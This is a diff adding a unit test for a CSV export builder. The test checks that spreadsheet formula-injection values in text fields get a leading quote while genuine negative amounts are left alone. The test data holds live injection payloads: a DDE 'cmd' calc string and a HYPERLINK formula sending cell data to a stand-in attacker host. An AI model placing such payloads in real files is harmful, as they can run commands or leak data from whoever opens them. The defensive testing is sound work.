@@ -56,6 +56,34 @@ describe("buildExportCsv", () => {
     expect(lines[3]!.endsWith(",")).toBe(true); // empty receipt_url is the last field
   });
 
+  it("neutralizes formula injection (CWE-1236) in text fields", async () => {
+    const csv = await buildExportCsv({
+      profileName: "=cmd|'/c calc'!A1",
+      periodLabel: "May 2026",
+      rows: [{
+        id: "x", txn_date: "2026-05-01",
+        merchant: '=HYPERLINK("http://evil.example/?d="&A1,"Receipt")',
+        cat_key: "office", amount_cents: -3300, gst_cents: -300, deductible_pct: 100,
+        payment_method: "@SUM(A1:A9)", note: "-2+3+cmd|' /C calc'!A0",
+      }],
+      receiptKeyByTxnId: new Map(),
+      baseUrl: "https://api.test",
+      signDownload: async () => "tok",
+    });
+    const lines = csv.split("\n");
+
+    // Profile name in the comment line is prefixed with a single quote.
+    expect(lines[0]).toContain("'=cmd");
+    // A formula-leading merchant is wrapped (it has a comma) AND prefixed with '.
+    expect(lines[2]).toContain(`"'=HYPERLINK`);
+    // payment_method (@...) and note (-...) are prefixed with a leading quote.
+    expect(lines[2]).toContain("'@SUM(A1:A9)");
+    expect(lines[2]).toContain("'-2+3");
+    // Legitimate negative dollar amounts are numeric columns — NOT prefixed.
+    expect(lines[2]).toContain("-33.00");
+    expect(lines[2]).not.toContain("'-33.00");
+  });
+
   it("quotes fields containing commas, quotes, or newlines (RFC 4180)", async () => {
     const csv = await buildExportCsv({
       profileName: "P", periodLabel: "May 2026",
